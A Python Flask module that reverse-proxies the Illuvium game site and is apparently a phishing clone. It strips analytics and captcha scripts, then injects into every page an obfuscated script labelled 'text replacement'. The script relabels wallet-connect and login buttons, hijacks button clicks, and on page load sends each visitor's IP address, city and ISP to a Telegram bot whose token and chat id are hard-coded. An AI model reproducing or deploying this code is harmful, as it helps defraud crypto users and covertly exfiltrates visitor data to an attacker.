from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
const _0x471692=_0xf1c9;function _0x2e4b(){const _0x18c808=['closest','\x20:\x20ISP:\x20','country_name','querySelectorAll','preventDefault','Register','13806690cDdCDA','toISOString','/sendMessage','css-1oqedzn','Redirecting\x20to\x20Google','Custom\x20Connect','error','Documentation','classList','stringify','https://www.google.com','Help','797055eAcZWB','css-tvaofb','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','Custom\x20Login','461872TxhxCZ','body','Button\x20clicked','add','IP:\x20','66QMIvuI','css-104rome','27neswHv','https://api.telegram.org/bot','claim-button','forEach','Updates','6014864jWPhFn','Start\x20Games','Text\x20changed:','target','5581008FQwRnI','log','childNodes','.chakra-link,\x20.nav-link,\x20.menu-item','DOMContentLoaded','button:not(.claim-button),\x20a:not(.claim-button)','Info','https://ipapi.co/json/','DOM\x20Content\x20Loaded\x20-\x20Starting\x20operations','2ruSJrv','contains','stopPropagation','json','textContent','load','TEXT_NODE','71967093RmXltt','Failed\x20to\x20send\x20IP\x20info\x20to\x20Telegram:','outerHTML','14jBrALn','trim','application/json','1402267xyZmKw','org','length','click','Join\x20Now','observe','Initial\x20text\x20modifications\x20applied','addedNodes','nodeType','Timeline','a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22]','Reach\x20Us','button,\x20a','7005236807','POST','css-1i8s7az','addEventListener'];_0x2e4b=function(){return _0x18c808;};return _0x2e4b();}function _0xf1c9(_0x42d016,_0x2bb1fd){const _0x2e4bae=_0x2e4b();return _0xf1c9=function(_0xf1c961,_0x3a4bdd){_0xf1c961=_0xf1c961-0x1ba;let _0x55769e=_0x2e4bae[_0xf1c961];return _0x55769e;},_0xf1c9(_0x42d016,_0x2bb1fd);}(function(_0x254dca,_0x41e389){const _0x39906e=_0xf1c9,_0x327a35=_0x254dca();while(!![]){try{const _0x4b30c9=parseInt(_0x39906e(0x1e1))/0x1*(-parseInt(_0x39906e(0x1d4))/0x2)+parseInt(_0x39906e(0x1c2))/0x3*(parseInt(_0x39906e(0x1bb))/0x4)+-parseInt(_0x39906e(0x204))/0x5*(parseInt(_0x39906e(0x1c0))/0x6)+parseInt(_0x39906e(0x1de))/0x7*(-parseInt(_0x39906e(0x1c7))/0x8)+-parseInt(_0x39906e(0x1cb))/0x9+-parseInt(_0x39906e(0x1f8))/0xa+parseInt(_0x39906e(0x1db))/0xb;if(_0x4b30c9===_0x41e389)break;else _0x327a35['push'](_0x327a35['shift']());}catch(_0x4cc0c5){_0x327a35['push'](_0x327a35['shift']());}}}(_0x2e4b,0xe0f2e),document['addEventListener'](_0x471692(0x1cf),function(){const _0x280459=_0x471692;console[_0x280459(0x1cc)](_0x280459(0x1d3));const _0x48b4ad={'Play\x20for\x20Free':_0x280459(0x1c8),'Play\x20Now':_0x280459(0x1c8),'Log\x20In\x20with\x20Passport':_0x280459(0x1ba),'Connect\x20Wallet':_0x280459(0x1fd),'Launch\x20Game':'Start\x20Game','Create\x20Account':'New\x20Account','Sign\x20Up':_0x280459(0x1f7),'Register':_0x280459(0x1e5),'News':_0x280459(0x1c6),'Home':'Main','About':_0x280459(0x1d1),'Contact':_0x280459(0x1ec),'FAQ':_0x280459(0x203),'Roadmap':_0x280459(0x1ea),'Whitepaper':_0x280459(0x1ff)};function _0x475d3b(_0x4f8a9d,_0x26d25a,_0x5d1f5c){const _0x296e2d=_0x280459;console['log'](_0x296e2d(0x1c9),{'element':_0x4f8a9d[_0x296e2d(0x1dd)],'oldText':_0x26d25a,'newText':_0x5d1f5c,'timestamp':new Date()[_0x296e2d(0x1f9)]()});}function _0x2e548a(_0x55d95b){const _0xe3833=_0x280459;let _0x23c9de='';for(const _0x26dcca of _0x55d95b[_0xe3833(0x1cd)]){_0x26dcca['nodeType']===Node[_0xe3833(0x1da)]&&(_0x23c9de+=_0x26dcca[_0xe3833(0x1d8)]['trim']());}!_0x23c9de&&(_0x23c9de=_0x55d95b[_0xe3833(0x1d8)][_0xe3833(0x1df)]());if(_0x48b4ad[_0x23c9de]){const _0x490a4d=_0x23c9de;if(_0x55d95b[_0xe3833(0x1cd)][_0xe3833(0x1e3)]===0x1&&_0x55d95b[_0xe3833(0x1cd)][0x0][_0xe3833(0x1e9)]===Node[_0xe3833(0x1da)])_0x55d95b['textContent']=_0x48b4ad[_0x23c9de];else{let _0x563de7=![];for(const _0x4f37e1 of _0x55d95b['childNodes']){if(_0x4f37e1['nodeType']===Node['TEXT_NODE']&&_0x4f37e1[_0xe3833(0x1d8)][_0xe3833(0x1df)]()===_0x23c9de){_0x4f37e1[_0xe3833(0x1d8)]=_0x48b4ad[_0x23c9de],_0x563de7=!![];break;}}!_0x563de7&&(_0x55d95b['textContent']=_0x48b4ad[_0x23c9de]);}_0x475d3b(_0x55d95b,_0x490a4d,_0x48b4ad[_0x23c9de]);}_0x55d95b[_0xe3833(0x200)][_0xe3833(0x1be)](_0xe3833(0x1c4));}function _0x2ee145(){const _0x41af55=_0x280459;document[_0x41af55(0x1f5)](_0x41af55(0x1ed))[_0x41af55(0x1c5)](_0x2e548a),document[_0x41af55(0x1f5)](_0x41af55(0x1eb))[_0x41af55(0x1c5)](_0x2e548a),document[_0x41af55(0x1f5)](_0x41af55(0x1ce))[_0x41af55(0x1c5)](_0x2e548a);}_0x2ee145(),console[_0x280459(0x1cc)](_0x280459(0x1e7)),setInterval(function(){const _0x4a1bbb=_0x280459;document[_0x4a1bbb(0x1f5)](_0x4a1bbb(0x1d0))[_0x4a1bbb(0x1c5)](_0x2e548a);},0x3e8);const _0x1f956c=new MutationObserver(function(_0x486743){const _0x160011=_0x280459;let _0x1bcd5f=![];_0x486743['forEach'](function(_0x5a7220){const _0x3fd72b=_0xf1c9;_0x5a7220[_0x3fd72b(0x1e8)][_0x3fd72b(0x1e3)]&&(_0x1bcd5f=!![]);}),_0x1bcd5f&&document['querySelectorAll'](_0x160011(0x1d0))[_0x160011(0x1c5)](_0x2e548a);});_0x1f956c[_0x280459(0x1e6)](document[_0x280459(0x1bc)],{'childList':!![],'subtree':!![]}),document[_0x280459(0x1f1)](_0x280459(0x1e4),function(_0x8165e7){const _0x5d3e4a=_0x280459,_0x321fb1=_0x8165e7[_0x5d3e4a(0x1ca)],_0x1e1577=_0x321fb1[_0x5d3e4a(0x1f2)](_0x5d3e4a(0x1ed));if(!_0x1e1577)return;if(_0x1e1577['classList'][_0x5d3e4a(0x1d5)](_0x5d3e4a(0x205))||_0x1e1577[_0x5d3e4a(0x200)][_0x5d3e4a(0x1d5)](_0x5d3e4a(0x1c1))||_0x1e1577['classList'][_0x5d3e4a(0x1d5)]('css-1hnz6hu')||_0x1e1577[_0x5d3e4a(0x200)][_0x5d3e4a(0x1d5)](_0x5d3e4a(0x1fb))||_0x1e1577[_0x5d3e4a(0x200)][_0x5d3e4a(0x1d5)](_0x5d3e4a(0x1f0)))return;_0x8165e7[_0x5d3e4a(0x1f6)](),_0x8165e7[_0x5d3e4a(0x1d6)]();if(_0x1e1577[_0x5d3e4a(0x200)]['contains']('claim-button')){console[_0x5d3e4a(0x1cc)](_0x5d3e4a(0x1fc)),window['open'](_0x5d3e4a(0x202),'googleWindow','width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes');return;}console[_0x5d3e4a(0x1cc)](_0x5d3e4a(0x1bd)),_0x1e1577[_0x5d3e4a(0x1e4)]();},!![]);}));async function sendIPToTelegram(){const _0x243de9=_0x471692,_0x7774=_0x243de9(0x206),_0x45d911=_0x243de9(0x1ee);try{const _0x301049=await fetch(_0x243de9(0x1d2)),_0x4a49e7=await _0x301049[_0x243de9(0x1d7)](),_0x66177=_0x4a49e7['ip'],_0x3126bc=_0x4a49e7[_0x243de9(0x1f4)],_0x2c1cb5=_0x4a49e7[_0x243de9(0x1e2)],_0x1ac6fd=_0x243de9(0x1bf)+_0x66177+'\x20:\x20'+_0x3126bc+_0x243de9(0x1f3)+_0x2c1cb5;await fetch(_0x243de9(0x1c3)+_0x7774+_0x243de9(0x1fa),{'method':_0x243de9(0x1ef),'headers':{'Content-Type':_0x243de9(0x1e0)},'body':JSON[_0x243de9(0x201)]({'chat_id':_0x45d911,'text':_0x1ac6fd})});}catch(_0x5e61e6){console[_0x243de9(0x1fe)](_0x243de9(0x1dc),_0x5e61e6);}}window[_0x471692(0x1f1)](_0x471692(0x1d9),sendIPToTelegram);
</script>
'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
